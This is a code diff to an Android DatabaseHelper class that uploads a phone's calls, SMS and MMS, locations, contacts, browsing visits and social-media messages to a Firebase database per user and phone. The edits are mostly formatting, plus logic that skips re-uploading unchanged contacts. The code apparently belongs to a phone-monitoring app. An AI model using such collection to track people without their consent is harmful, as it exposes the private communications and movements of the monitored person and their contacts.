@@ -58,9 +58,9 @@ public class DatabaseHelper {
                 callMap.put("timestamp", callData.getTimestamp());
                 callMap.put("contactName", callData.getContactName()); // Include contact name
 
-                callRef.setValue(callMap).addOnSuccessListener(aVoid ->
+                callRef.setValue(callMap).addOnSuccessListener(aVoid -> 
                                 Log.d("DatabaseHelper", "Call data uploaded successfully."))
-                        .addOnFailureListener(e ->
+                        .addOnFailureListener(e -> 
                                 Log.e("DatabaseHelper", "Failed to upload call data: " + e.getMessage()));
             } else {
                 Log.d("DatabaseHelper", "Duplicate call data found for recent call, skipping upload.");
@@ -80,11 +80,11 @@ public class DatabaseHelper {
                 smsMap.put("body", smsData.getBody());
                 smsMap.put("timestamp", smsData.getTimestamp());
                 smsMap.put("date", smsData.getDate());
-                smsMap.put("contactName", smsData.getContactName()); // Include contact name
+                smsMap.put("contactName", smsData.getContactName()); 
 
-                smsRef.setValue(smsMap).addOnSuccessListener(aVoid ->
+                smsRef.setValue(smsMap).addOnSuccessListener(aVoid -> 
                                 Log.d("DatabaseHelper", "SMS data uploaded successfully."))
-                        .addOnFailureListener(e ->
+                        .addOnFailureListener(e -> 
                                 Log.e("DatabaseHelper", "Failed to upload SMS data: " + e.getMessage()));
             } else {
                 Log.d("DatabaseHelper", "Duplicate SMS data found for recent SMS, skipping upload.");
@@ -104,9 +104,9 @@ public class DatabaseHelper {
                 mmsMap.put("senderAddress", mmsData.getSenderAddress());
                 mmsMap.put("content", mmsData.getContent());
 
-                mmsRef.setValue(mmsMap).addOnSuccessListener(aVoid ->
+                mmsRef.setValue(mmsMap).addOnSuccessListener(aVoid -> 
                                 Log.d("DatabaseHelper", "MMS data uploaded successfully."))
-                        .addOnFailureListener(e ->
+                        .addOnFailureListener(e -> 
                                 Log.e("DatabaseHelper", "Failed to upload MMS data: " + e.getMessage()));
             } else {
                 Log.d("DatabaseHelper", "Duplicate MMS data found for recent MMS, skipping upload.");
@@ -114,7 +114,7 @@ public class DatabaseHelper {
         }).addOnFailureListener(e -> Log.e("DatabaseHelper", "Error checking for duplication: " + e.getMessage()));
     }
 
-    // Upload location data
+    // Upload location data by date
     public void uploadLocationDataByDate(String userId, String phoneModel, Map<String, Object> locationData, String uniqueLocationId, String locationDate) {
         String sanitizedLocationId = sanitizePath(uniqueLocationId);
         DatabaseReference locationRef = getPhoneDataReference(userId, phoneModel, "location", sanitizedLocationId, locationDate);
@@ -132,35 +132,46 @@ public class DatabaseHelper {
         }).addOnFailureListener(e -> Log.e("DatabaseHelper", "Error accessing Firebase: " + e.getMessage()));
     }
 
-    // Upload contact data
+    // Upload contact data without date node
     public void uploadContactData(String userId, String phoneModel, ContactData contactData, String uniqueContactId) {
         DatabaseReference contactRef = getPhoneDataReference(userId, phoneModel, "contacts", uniqueContactId, "");
 
         contactRef.get().addOnCompleteListener(task -> {
-            if (task.isSuccessful() && task.getResult().exists()) {
-                // Contact exists, meaning it's an update
-                ContactData existingContact = task.getResult().getValue(ContactData.class);
-                if (existingContact != null) {
-                    // Set the original name before modification
-                    contactData.setNameBeforeModification(existingContact.getName());
-                }
-                // Update the last modified time
-                contactData.setLastModifiedTime(System.currentTimeMillis());
-            } else {
-                // It's a new contact, so set the creation time
-                contactData.setCreationTime(System.currentTimeMillis());
-            }
-
-            // Upload the contact data with the appropriate timestamps
-            contactRef.setValue(contactData)
-                    .addOnCompleteListener(uploadTask -> {
-                        if (uploadTask.isSuccessful()) {
-                            Log.d("DatabaseHelper", "Contact data uploaded successfully.");
+            if (task.isSuccessful()) {
+                DataSnapshot snapshot = task.getResult();
+                if (snapshot.exists()) {
+                    // Contact exists, check if it's actually changed
+                    ContactData existingContact = snapshot.getValue(ContactData.class);
+                    if (existingContact != null) {
+                        // Only update if the contact details have actually changed
+                        if (!existingContact.getPhoneNumber().equals(contactData.getPhoneNumber()) ||
+                            !existingContact.getName().equals(contactData.getName())) {
+                            
+                            // Set the original name before modification
+                            contactData.setNameBeforeModification(existingContact.getName());
+                            contactData.setLastModifiedTime(System.currentTimeMillis());
+                            
+                            // Upload the updated contact
+                            uploadContactToFirebase(contactRef, contactData);
                         } else {
-                            Log.e("DatabaseHelper", "Error uploading contact data: " + uploadTask.getException().getMessage());
+                            Log.d(TAG, "Contact unchanged, skipping upload: " + contactData.getName());
                         }
-                    });
+                    }
+                } else {
+                    // It's a new contact
+                    contactData.setCreationTime(System.currentTimeMillis());
+                    uploadContactToFirebase(contactRef, contactData);
+                }
+            } else {
+                Log.e(TAG, "Error checking existing contact: " + task.getException().getMessage());
+            }
         });
+    }
+
+    private void uploadContactToFirebase(DatabaseReference contactRef, ContactData contactData) {
+        contactRef.setValue(contactData)
+                .addOnSuccessListener(aVoid -> Log.d(TAG, "Contact uploaded successfully: " + contactData.getName()))
+                .addOnFailureListener(e -> Log.e(TAG, "Failed to upload contact: " + e.getMessage()));
     }
 
     public Task<Void> uploadAppData(String userId, String phoneModel, String uniqueKey, Map<String, Object> appMap) {
@@ -212,7 +223,6 @@ public class DatabaseHelper {
     }
 
     public Task<Void> uploadWebVisitDataByDate(String userId, String phoneModel, WebVisitData visitData) {
-        // Use the standard path structure: users/{userId}/phones/{phoneModel}/web_visits/{date}
         DatabaseReference dbRef = database.child(userId)
                 .child("phones")
                 .child(phoneModel)
@@ -315,15 +325,15 @@ public class DatabaseHelper {
         }
     }
 
+    // Upload Social Media messages with date node 
     public void uploadSocialMessageData(String userId, String phoneModel, MessageData messageData, String uniqueMessageId, String messageDate, String platform) {
-        // Adjusting the call to getPhoneDataReference to match the expected number of arguments
         DatabaseReference messageRef = database.child(userId)
                 .child("phones")
                 .child(phoneModel)
                 .child("social_media_messages")
-                .child(messageDate) // Group by date
-                .child(platform) // Group by platform
-                .child(uniqueMessageId); // Use unique ID for each message
+                .child(messageDate) 
+                .child(platform) 
+                .child(uniqueMessageId); 
 
         messageRef.get().addOnCompleteListener(task -> {
             if (task.isSuccessful() && !task.getResult().exists()) {
@@ -437,7 +447,7 @@ public class DatabaseHelper {
         // Replace any character that's not alphanumeric, underscore, or hyphen
         String sanitized = originalPath.replaceAll("[^a-zA-Z0-9_-]", "_");
         
-        // Ensure the path doesn't start with a number (Firebase requirement)
+        // Ensure the path doesn't start with a number 
         if (sanitized.matches("^[0-9].*")) {
             sanitized = "_" + sanitized;
         }
